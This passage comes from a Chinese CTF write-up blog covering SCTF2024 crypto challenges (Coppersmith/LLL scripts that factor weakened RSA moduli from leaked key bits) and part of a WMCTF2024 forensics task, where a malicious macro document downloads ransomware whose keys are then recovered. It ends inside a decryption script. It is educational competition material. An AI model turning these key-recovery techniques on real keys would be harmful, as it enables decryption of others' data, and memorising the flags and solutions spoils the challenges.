aria-hidden="true">image-20241002134813182</figcaption></figure><p>用地图编辑器tedit打开可以看到一个奇怪的字符串</p><figure><img src="/images/SCTF2024-部分Writeup-复现/image-20241002134935187.png"alt="image-20241002134935187" /><figcaption aria-hidden="true">image-20241002134935187</figcaption></figure><p>用cyberchef爆破可以发现异或密钥e时可以得到flag</p><figure><img src="/images/SCTF2024-部分Writeup-复现/image-20241002135126430.png"alt="image-20241002135126430" /><figcaption aria-hidden="true">image-20241002135126430</figcaption></figure><h3 id="crypto">Crypto</h3><h4 id="signin">Signin</h4><p>题目</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> sage.<span class="built_in">all</span> <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> md5</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">RSA</span>():</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, nbits</span>):</span><br><span class="line">        self.nbits = nbits</span><br><span class="line">        self.p, self.q = self.getPrimes()</span><br><span class="line">        self.n = self.p*self.q</span><br><span class="line">        self.Gift = self.Gift()</span><br><span class="line">        self.priv, self.pub = self.keyGen()</span><br><span class="line">        </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">getPrimes</span>(<span class="params">self</span>):</span><br><span class="line">        nbits = self.nbits</span><br><span class="line">        p = random_prime(<span class="number">2</span>^(nbits-<span class="number">1</span>),lbound=<span class="number">2</span>^(nbits-<span class="number">2</span>))</span><br><span class="line">        q = random_prime(<span class="number">2</span>^(nbits-<span class="number">1</span>),lbound=<span class="number">2</span>^(nbits-<span class="number">2</span>))</span><br><span class="line">        <span class="keyword">while</span> p == q:</span><br><span class="line">            q = random_prime(<span class="number">2</span>^(nbits-<span class="number">1</span>),lbound=<span class="number">2</span>^(nbits-<span class="number">2</span>))</span><br><span class="line">        <span class="keyword">return</span> p,q</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">Gift</span>(<span class="params">self</span>):</span><br><span class="line">        p,q = self.p, self.q</span><br><span class="line">        <span class="keyword">return</span> (p^<span class="number">2</span> + p + <span class="number">1</span>)*(q^<span class="number">2</span> + q + <span class="number">1</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">keyGen</span>(<span class="params">self</span>):</span><br><span class="line">        nbits = self.nbits</span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            d = randint(<span class="number">2</span>^(nbits//<span class="number">4</span>),<span class="number">2</span>^(nbits//<span class="number">2</span>))</span><br><span class="line">            <span class="keyword">if</span> gcd(d,self.Gift) != <span class="number">1</span>:</span><br><span class="line">                d = randint(<span class="number">2</span>^(nbits//<span class="number">4</span>),<span class="number">2</span>^(nbits//<span class="number">2</span>))</span><br><span class="line">            e = <span class="built_in">pow</span>(d,-<span class="number">1</span>,self.phi)</span><br><span class="line">            <span class="keyword">return</span> (self.p,self.q,self.n,e,d),(self.n,e)</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">RRR = RSA(<span class="number">512</span>)</span><br><span class="line"></span><br><span class="line">bp = long_to_bytes(<span class="built_in">int</span>(RRR.p))</span><br><span class="line">FLAG = <span class="string">&#x27;SCTF&#123;&#x27;</span>+md5(bp).hexdigest()+<span class="string">&#x27;&#125;&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;N = <span class="subst">&#123;RRR.n&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;e = <span class="subst">&#123;RRR.pub[<span class="number">1</span>]&#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">N = 32261421478213846055712670966502489204755328170115455046538351164751104619671102517649635534043658087736634695616391757439732095084483689790126957681118278054587893972547230081514687941476504846573346232349396528794022902849402462140720882761797608629678538971832857107919821058604542569600500431547986211951</span></span><br><span class="line"><span class="string">e = 334450817132213889699916301332076676907807495738301743367532551341259554597455532787632746522806063413194057583998858669641413549469205803510032623432057274574904024415310727712701532706683404590321555542304471243731711502894688623443411522742837178384157350652336133957839779184278283984964616921311020965540513988059163842300284809747927188585982778365798558959611785248767075169464495691092816641600277394649073668575637386621433598176627864284154484501969887686377152288296838258930293614942020655916701799531971307171423974651394156780269830631029915305188230547099840604668445612429756706738202411074392821840</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><p>这里的phi变成了(p^2 + p + 1)*(q^2 + q + 1)，也就是 <spanclass="math display">\[ed=1 (mod \varphi)\]</span></p><p><span class="math display">\[ed=1+k(p^2+p+1)(q^2+q+1)\]</span></p><p><span class="math display">\[ed=1+k(n^2-n+1+(n+1)(p+q)+(p+q)^2)\]</span></p><p><span class="math display">\[0\equiv 1+k(n^2-n+1+(n+1)(p+q)+(p+q)^2)\ (mod\ e)\]</span></p><p>令x=k，y=p+q，即可进行二元coppersmith</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">import itertools</span><br><span class="line">def small_roots(f, bounds, m=1, d=None):#多元copper</span><br><span class="line">    if not d:</span><br><span class="line">        d = f.degree()</span><br><span class="line">    R = f.base_ring()</span><br><span class="line">    N = R.cardinality()</span><br><span class="line">    f /= f.coefficients().pop(0)</span><br><span class="line">    f = f.change_ring(ZZ)</span><br><span class="line">    G = Sequence([], f.parent())</span><br><span class="line">    for i in range(m + 1):</span><br><span class="line">        base = N ^ (m - i) * f ^ i</span><br><span class="line">        for shifts in itertools.product(range(d), repeat=f.nvariables()):</span><br><span class="line">            g = base * prod(map(power, f.variables(), shifts))</span><br><span class="line">            G.append(g)</span><br><span class="line">    B, monomials = G.coefficient_matrix()</span><br><span class="line">    monomials = vector(monomials)</span><br><span class="line">    factors = [monomial(*bounds) for monomial in monomials]</span><br><span class="line">    for i, factor in enumerate(factors):</span><br><span class="line">        B.rescale_col(i, factor)</span><br><span class="line">    B = B.dense_matrix().LLL()</span><br><span class="line">    B = B.change_ring(QQ)</span><br><span class="line">    for i, factor in enumerate(factors):</span><br><span class="line">        B.rescale_col(i, 1 / factor)</span><br><span class="line">    H = Sequence([], f.parent().change_ring(QQ))</span><br><span class="line">    for h in filter(None, B * monomials):</span><br><span class="line">        H.append(h)</span><br><span class="line">        I = H.ideal()</span><br><span class="line">        if I.dimension() == -1:</span><br><span class="line">            H.pop()</span><br><span class="line">        elif I.dimension() == 0:</span><br><span class="line">            roots = []</span><br><span class="line">            for root in I.variety(ring=ZZ):</span><br><span class="line">                root = tuple(R(root[var]) for var in f.variables())</span><br><span class="line">                roots.append(root)</span><br><span class="line">            return roots</span><br><span class="line">    return []</span><br><span class="line">N = 32261421478213846055712670966502489204755328170115455046538351164751104619671102517649635534043658087736634695616391757439732095084483689790126957681118278054587893972547230081514687941476504846573346232349396528794022902849402462140720882761797608629678538971832857107919821058604542569600500431547986211951</span><br><span class="line">e = 334450817132213889699916301332076676907807495738301743367532551341259554597455532787632746522806063413194057583998858669641413549469205803510032623432057274574904024415310727712701532706683404590321555542304471243731711502894688623443411522742837178384157350652336133957839779184278283984964616921311020965540513988059163842300284809747927188585982778365798558959611785248767075169464495691092816641600277394649073668575637386621433598176627864284154484501969887686377152288296838258930293614942020655916701799531971307171423974651394156780269830631029915305188230547099840604668445612429756706738202411074392821840</span><br><span class="line">PR.&lt;x, y&gt; = PolynomialRing(Zmod(e))</span><br><span class="line">f = 1 + x * (N ^ 2 - N + 1 + (N + 1) * y + y ^ 2)</span><br><span class="line">a,b = small_roots(f, bounds = (2 ^ 512, 2 ^ 513), m = 3, d = 2)[0]</span><br><span class="line">var(&#x27;x y&#x27;)</span><br><span class="line">solve([x+y==int(b),x*y==N],[x,y])</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure><img src="/images/SCTF2024-部分Writeup-复现/image-20241002172441065.png"alt="image-20241002172441065" /><figcaption aria-hidden="true">image-20241002172441065</figcaption></figure><h4 id="不完全阻塞干扰">不完全阻塞干扰</h4><p>题目给了一个不完整的私钥文件和以下代码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># The ship crashed into the sun, causing a massive magnetic storm</span></span><br><span class="line"><span class="comment">#part of script</span></span><br><span class="line">msg = bytes_to_long(FLAG)</span><br><span class="line">n = p^<span class="number">5</span>*q^<span class="number">2</span></span><br><span class="line">phi = p^<span class="number">4</span>*(p-<span class="number">1</span>)*q*(q-<span class="number">1</span>)</span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">d = inverse(d,phi)</span><br><span class="line">c = <span class="built_in">pow</span>(m,e,n)</span><br><span class="line"><span class="comment"># c = 145554802564989933772666853449758467748433820771006616874558211691441588216921262672588167631397770260815821197485462873358280668164496459053150659240485200305314288108259163251006446515109018138298662011636423264380170119025895000021651886702521266669653335874489612060473962259596489445807308673497717101487224092493721535129391781431853820808463529747944795809850314965769365750993208968116864575686200409653590102945619744853690854644813177444995458528447525184291487005845375945194236352007426925987404637468097524735905540030962884807790630389799495153548300450435815577962308635103143187386444035094151992129110267595908492217520416633466787688326809639286703608138336958958449724993250735997663382433125872982238289419769011271925043792124263306262445811864346081207309546599603914842331643196984128658943528999381048833301951569809038023921101787071345517702911344900151843968213911899353962451480195808768038035044446206153179737023140055693141790385662942050774439391111437140968754546526191031278186881116757268998843581015398070043778631790328583529667194481319953424389090869226474999123124532354330671462280959215310810005231660418399403337476289138527331553267291013945347058144254374287422377547369897793812634181778309679601143245890494670013019155942690562552431527149178906855998534415120428884098317318129659099377634006938812654262148522236268027388683027513663867042278407716812565374141362015467076472409873946275500942547114202939578755575249750674734066843408758067001891408572444119999801055605577737379889503505649865554353749621313679734666376467890526136184241450593948838055612677564667946098308716892133196862716086041690426537245252116765796203427832657608512488619438752378624483485364908432609100523022628791451171084583484294929190998796485805496852608557456380717623462846198636093701726099310737244471075079541022111303662778829695340275795782631315412134758717966727565043332335558077486037869874106819581519353856396937832498623662166446395755447101393825864584024239951058366713573567250863658531585064635727070458886746791722270803893438211751165831616861912569513431821959562450032831904268205845224077709362068478</span></span><br></pre></td></tr></table></figure><figure><img src="/images/SCTF2024-部分Writeup-复现/image-20241002220823339.png"alt="image-20241002220823339" /><figcaption aria-hidden="true">image-20241002220823339</figcaption></figure><p>先手撕一下私钥</p><blockquote><p>当时由于对后面的两个已知部分密钥手撕的问题，导致卡住了。。。</p></blockquote><figure><img src="/images/SCTF2024-部分Writeup-复现/image-20241002220951499.png"alt="image-20241002220951499" /><figcaption aria-hidden="true">image-20241002220951499</figcaption></figure><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">n=0x067f0aa4e974a63a1ffe8d5c23e5d3c431653ae41cc746f305f62a9f193f22486cb7ef1b275634818f46d0752a5139e19918271fa0d7d27bc660d2b72414d08ea52c8837f949c7baecc3029ba31727ef3bf120d9926c02d7412f187e98dc56dd07b987d2cc191ad56164a144f28b2f70a15d105588a4f27fbb2891fc527bd6890a5f795b5c48476a6bf9dfb67b7e1ebc7b1b086cd28b58c68955bfdf44ecce11ffacdf654551b159b7832040cc28ee8ebea48f8672d53e3de88fcfbb5fb276b503880dd34d5993335ddf8ccb96c1b4d79f502d72104765ad9c2b1858a17af3d5be44fa3cbf4b8eeb942aa3942a3871d2c65ac70289123fc2e9f9b25cbfcbd7841096060fa504c3a07b591493c64c88d0bb45285a85b5f7d59db98faa00c2cd3fbb63da599205f1cab0df52cf7b431a0ee4a7e35696546ce9d03ef595ecee92d2142c92e97d2744939703455b4c70dec27c321ec6b83c029622e83a9e0d55d0b258d95d4e61291865dda76dc619fce9577990429c6e77e9d40781e3b2f449701b83e8b0c6c66eb380f96473e5d422efee8b2b0e88b716b00a79c9d514ca3ad9d2dee526609ff9541732a4198d11b9dbfbb2e55c24d80ea522d0786e3355f23606a5d38a72de4eefc8b6bfc482248a2862cb69d8e0e3d316597da9d80828be85054faf15fc369caacafb815c6973c171940683d56a1a1967b09b7ffa3fbe5b2e08699759d84d71603f516447696bb27322a69f39f6ca253e00dc9555d5f97328070c467f3663cc489aad130f28c42f35bf88c571920ab92acb8f75d03e35a75103c5bd96f061c96bd02af6e1d191b0dd164bc721377003edbf5d3ef65a5e9046385356b521623bee37f164850a0a7afb0ed4e7e8bd9afe1298f7d532bc9ad941812d332aece75d1cccb1ff69fd42b31f248ae579d9e0d6a14b0546e784ba940e32bd01c395df8ff4584040462b5479fa07336d503dc332e70fc06d9463297fc042b623d56f87efaa525a9b580e314d90d1211893ed407a26508deaa0a13c9ee8c902b9e1c3a02fe9a51452c02ee7bdcc85c0eff63891e24703bd265d9c9dbf456e2af9409538bce0fecc7ebab20266aaab06c766c3ea6cda9cb9ba5e1d024b7dc3d73e76f6a333197bad87c4fb34d565a0014aac72825e41adcfeadadc87acef40ad84b7c55691abad561be0550ea0a988470c427432acb8feb2b9d2d2598fb2089bb91bbd9cb199e892d36164d8bf3ecd54576a97134047a12da84207485bb4e5</span><br></pre></td></tr></table></figure><p>接下来的base64解码时，都需要先把开头的o删掉，这样才能看到熟悉的tag头181</p><figure><img src="/images/SCTF2024-部分Writeup-复现/image-20241002221256841.png"alt="image-20241002221256841" /><figcaption aria-hidden="true">image-20241002221256841</figcaption></figure><figure><img src="/images/SCTF2024-部分Writeup-复现/image-20241002221331466.png"alt="image-20241002221331466" /><figcaption aria-hidden="true">image-20241002221331466</figcaption></figure><p>这里得到的分别是p和q的高位</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ph=0x8063d0a21876e5ce1e2101c20015529066ed9976882d1002a29efe0f2fdfcc2743fc9a4b5b651cc97108699eca2fb1f3d93175bae343e7c92e4a41c72d05e570194</span><br><span class="line">qh=0xe4f0fe49f9ae1492c097a0a988fa71876625fe4fce05b0204f1fdf43ec64b4dac699d28e166efdfc7562d19e58c3493d9100365cf2840b46c0f6ee8d964807170ff2c13c4eb8012ecab37862a39</span><br></pre></td></tr></table></figure><p>显然接下来就是二元coppersmith</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line">import itertools</span><br><span class="line">import libnum</span><br><span class="line">def small_roots(f, bounds, m=1, d=None):</span><br><span class="line">    if not d:</span><br><span class="line">        d = f.degree()</span><br><span class="line">    R = f.base_ring()</span><br><span class="line">    N = R.cardinality()</span><br><span class="line">    f /= f.coefficients().pop(0)</span><br><span class="line">    f = f.change_ring(ZZ)</span><br><span class="line">    G = Sequence([], f.parent())</span><br><span class="line">    for i in range(m + 1):</span><br><span class="line">        base = N ^ (m - i) * f ^ i</span><br><span class="line">        for shifts in itertools.product(range(d), repeat=f.nvariables()):</span><br><span class="line">            g = base * prod(map(power, f.variables(), shifts))</span><br><span class="line">            G.append(g)</span><br><span class="line">    B, monomials = G.coefficient_matrix()</span><br><span class="line">    monomials = vector(monomials)</span><br><span class="line">    factors = [monomial(*bounds) for monomial in monomials]</span><br><span class="line">    for i, factor in enumerate(factors):</span><br><span class="line">        B.rescale_col(i, factor)</span><br><span class="line">    B = B.dense_matrix().LLL()</span><br><span class="line">    B = B.change_ring(QQ)</span><br><span class="line">    for i, factor in enumerate(factors):</span><br><span class="line">        B.rescale_col(i, 1 / factor)</span><br><span class="line">    H = Sequence([], f.parent().change_ring(QQ))</span><br><span class="line">    for h in filter(None, B * monomials):</span><br><span class="line">        H.append(h)</span><br><span class="line">        I = H.ideal()</span><br><span class="line">        if I.dimension() == -1:</span><br><span class="line">            H.pop()</span><br><span class="line">        elif I.dimension() == 0:</span><br><span class="line">            roots = []</span><br><span class="line">            for root in I.variety(ring=ZZ):</span><br><span class="line">                root = tuple(R(root[var]) for var in f.variables())</span><br><span class="line">                roots.append(root)</span><br><span class="line">            return roots</span><br><span class="line">    return []</span><br><span class="line">c = 145554802564989933772666853449758467748433820771006616874558211691441588216921262672588167631397770260815821197485462873358280668164496459053150659240485200305314288108259163251006446515109018138298662011636423264380170119025895000021651886702521266669653335874489612060473962259596489445807308673497717101487224092493721535129391781431853820808463529747944795809850314965769365750993208968116864575686200409653590102945619744853690854644813177444995458528447525184291487005845375945194236352007426925987404637468097524735905540030962884807790630389799495153548300450435815577962308635103143187386444035094151992129110267595908492217520416633466787688326809639286703608138336958958449724993250735997663382433125872982238289419769011271925043792124263306262445811864346081207309546599603914842331643196984128658943528999381048833301951569809038023921101787071345517702911344900151843968213911899353962451480195808768038035044446206153179737023140055693141790385662942050774439391111437140968754546526191031278186881116757268998843581015398070043778631790328583529667194481319953424389090869226474999123124532354330671462280959215310810005231660418399403337476289138527331553267291013945347058144254374287422377547369897793812634181778309679601143245890494670013019155942690562552431527149178906855998534415120428884098317318129659099377634006938812654262148522236268027388683027513663867042278407716812565374141362015467076472409873946275500942547114202939578755575249750674734066843408758067001891408572444119999801055605577737379889503505649865554353749621313679734666376467890526136184241450593948838055612677564667946098308716892133196862716086041690426537245252116765796203427832657608512488619438752378624483485364908432609100523022628791451171084583484294929190998796485805496852608557456380717623462846198636093701726099310737244471075079541022111303662778829695340275795782631315412134758717966727565043332335558077486037869874106819581519353856396937832498623662166446395755447101393825864584024239951058366713573567250863658531585064635727070458886746791722270803893438211751165831616861912569513431821959562450032831904268205845224077709362068478</span><br><span class="line">n=0x067f0aa4e974a63a1ffe8d5c23e5d3c431653ae41cc746f305f62a9f193f22486cb7ef1b275634818f46d0752a5139e19918271fa0d7d27bc660d2b72414d08ea52c8837f949c7baecc3029ba31727ef3bf120d9926c02d7412f187e98dc56dd07b987d2cc191ad56164a144f28b2f70a15d105588a4f27fbb2891fc527bd6890a5f795b5c48476a6bf9dfb67b7e1ebc7b1b086cd28b58c68955bfdf44ecce11ffacdf654551b159b7832040cc28ee8ebea48f8672d53e3de88fcfbb5fb276b503880dd34d5993335ddf8ccb96c1b4d79f502d72104765ad9c2b1858a17af3d5be44fa3cbf4b8eeb942aa3942a3871d2c65ac70289123fc2e9f9b25cbfcbd7841096060fa504c3a07b591493c64c88d0bb45285a85b5f7d59db98faa00c2cd3fbb63da599205f1cab0df52cf7b431a0ee4a7e35696546ce9d03ef595ecee92d2142c92e97d2744939703455b4c70dec27c321ec6b83c029622e83a9e0d55d0b258d95d4e61291865dda76dc619fce9577990429c6e77e9d40781e3b2f449701b83e8b0c6c66eb380f96473e5d422efee8b2b0e88b716b00a79c9d514ca3ad9d2dee526609ff9541732a4198d11b9dbfbb2e55c24d80ea522d0786e3355f23606a5d38a72de4eefc8b6bfc482248a2862cb69d8e0e3d316597da9d80828be85054faf15fc369caacafb815c6973c171940683d56a1a1967b09b7ffa3fbe5b2e08699759d84d71603f516447696bb27322a69f39f6ca253e00dc9555d5f97328070c467f3663cc489aad130f28c42f35bf88c571920ab92acb8f75d03e35a75103c5bd96f061c96bd02af6e1d191b0dd164bc721377003edbf5d3ef65a5e9046385356b521623bee37f164850a0a7afb0ed4e7e8bd9afe1298f7d532bc9ad941812d332aece75d1cccb1ff69fd42b31f248ae579d9e0d6a14b0546e784ba940e32bd01c395df8ff4584040462b5479fa07336d503dc332e70fc06d9463297fc042b623d56f87efaa525a9b580e314d90d1211893ed407a26508deaa0a13c9ee8c902b9e1c3a02fe9a51452c02ee7bdcc85c0eff63891e24703bd265d9c9dbf456e2af9409538bce0fecc7ebab20266aaab06c766c3ea6cda9cb9ba5e1d024b7dc3d73e76f6a333197bad87c4fb34d565a0014aac72825e41adcfeadadc87acef40ad84b7c55691abad561be0550ea0a988470c427432acb8feb2b9d2d2598fb2089bb91bbd9cb199e892d36164d8bf3ecd54576a97134047a12da84207485bb4e5</span><br><span class="line">ph = 0x008063D0A21876E5CE1E2101C20015529066ED9976882D1002A29EFE0F2FDFCC2743FC9A4B5B651CC97108699ECA2FB1F3D93175BAE343E7C92E4A41C72D05E570194</span><br><span class="line">qh = 0x00E4F0FE49F9AE1492C097A0A988FA71876625FE4FCE05B0204F1FDF43EC64B4DAC699D28E166EFDFC7562D19E58C3493D9100365CF2840B46C0F6EE8D964807170FF2C13C4EB8012ECAB37862A39</span><br><span class="line">ph=ph&lt;&lt;(1024-524)</span><br><span class="line">qh=qh&lt;&lt;(1024-620)</span><br><span class="line">e=65537</span><br><span class="line">PR.&lt;x1,x2&gt; = Zmod(n)[]</span><br><span class="line">f = (ph + x1) ^ 5 * (qh + x2) ^ 2</span><br><span class="line">pl,ql=small_roots(f, bounds=(2**(1024-524), 2**(1024-620)), m=2, d=3)[0]</span><br><span class="line">p=int(pl)+ph</span><br><span class="line">q=int(ql)+qh</span><br><span class="line">phi = p^4*(p-1)*q*(q-1)</span><br><span class="line">d = inverse_mod(e,phi)</span><br><span class="line">m=int(pow(c,d,n))</span><br><span class="line">print(libnum.n2s(m))</span><br></pre></td></tr></table></figure><figure><img src="/images/SCTF2024-部分Writeup-复现/image-20241002233627615.png"alt="image-20241002233627615" /><figcaption aria-hidden="true">image-20241002233627615</figcaption></figure>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Writeup </tag>
            
            <tag> CTF </tag>
            
            <tag> SCTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>WMCTF2024 部分Misc 复现</title>
      <link href="/posts/cc16e4/"/>
      <url>/posts/cc16e4/</url>
      
        <content type="html"><![CDATA[<blockquote><p>misc那么多题，除了签到题一题都不会。。。o(╥﹏╥)o其中partytime这题因为不会逆向而卡住了。。。不懂的还是太多了，还得多沉淀沉淀。</p><p>在这里复现一下学长出的两道取证题。</p></blockquote><h3 id="party-time">Party Time</h3><p>ftk挂载一下，可以看到桌面上有flag.rar，Partyinvitation.docm和readme.txt，提取出来</p><figure><img src="/images/WMCTF2024-部分Misc-复现/image-20240924002423222.png"alt="image-20240924002423222" /><figcaption aria-hidden="true">image-20240924002423222</figcaption></figure><p>把partyinvitation.docm丢进云沙箱，不出意料的报毒了，可以看到在宏里面执行了一个ps命令，下载了一个叫做windows_update_20240813.exe的程序，大概是个病毒。</p><figure><img src="/images/WMCTF2024-部分Misc-复现/image-20240924003410144.png"alt="image-20240924003410144" /><figcaption aria-hidden="true">image-20240924003410144</figcaption></figure><p>用volatility从所给的镜像中找一下这个程序在哪，用ftk提取出来。</p><figure><img src="/images/WMCTF2024-部分Misc-复现/image-20240924004413133.png"alt="image-20240924004413133" /><figcaption aria-hidden="true">image-20240924004413133</figcaption></figure><blockquote><p>当时就是卡这了，因为不会逆向。。。</p></blockquote><p>对这个exe程序进行逆向，可以发现这个程序简单来说是会自动对文件进行OAEP填充的RSA加密的操作，也就是一个勒索病毒。</p><figure><img src="/images/WMCTF2024-部分Misc-复现/image-20240924005108852.png"alt="image-20240924005108852" /><figcaption aria-hidden="true">image-20240924005108852</figcaption></figure><p>可以看到，公钥和私钥都被藏在了注册表里</p><figure><img src="/images/WMCTF2024-部分Misc-复现/image-20240924005428298.png"alt="image-20240924005428298" /><figcaption aria-hidden="true">image-20240924005428298</figcaption></figure><p>还有个devicekey，是对主机名进行了sha256加密</p><figure><img src="/images/WMCTF2024-部分Misc-复现/image-20240924005522228.png"alt="image-20240924005522228" /><figcaption aria-hidden="true">image-20240924005522228</figcaption></figure><p>用volatility提取注册表中的私钥，以及查看主机名（可通过查看环境变量得到）</p><figure><img src="/images/WMCTF2024-部分Misc-复现/image-20240924005959512.png"alt="image-20240924005959512" /><figcaption aria-hidden="true">image-20240924005959512</figcaption></figure><figure><img src="/images/WMCTF2024-部分Misc-复现/image-20240924010338906.png"alt="image-20240924010338906" /><figcaption aria-hidden="true">image-20240924010338906</figcaption></figure><p>写脚本进行解密，这里直接贴官方脚本</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">&quot;crypto/rand&quot;</span></span><br><span class="line"><span class="string">&quot;crypto/rsa&quot;</span></span><br><span class="line"><span class="string">&quot;crypto/sha256&quot;</span></span><br><span 